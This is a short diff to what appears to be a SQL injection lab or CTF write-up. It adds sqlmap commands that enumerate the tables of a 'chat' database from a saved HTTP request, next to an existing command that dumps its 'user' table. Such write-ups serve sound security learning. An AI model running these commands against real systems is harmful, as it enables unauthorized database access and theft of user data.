@@ -33,6 +33,12 @@ Cookie: PHPSESSID=m7ffe2uiavtmhbkmupt24lh2qi
 msg=hi&id=1
 ```
 #### SQLmap
+```
+sqlmap -r r.txt --tables
+```
+```
+sqlmap -r r.txt --tables -D chat
+```
 ```console
 sqlmap -r r.txt --dump -D chat -T user
 ```
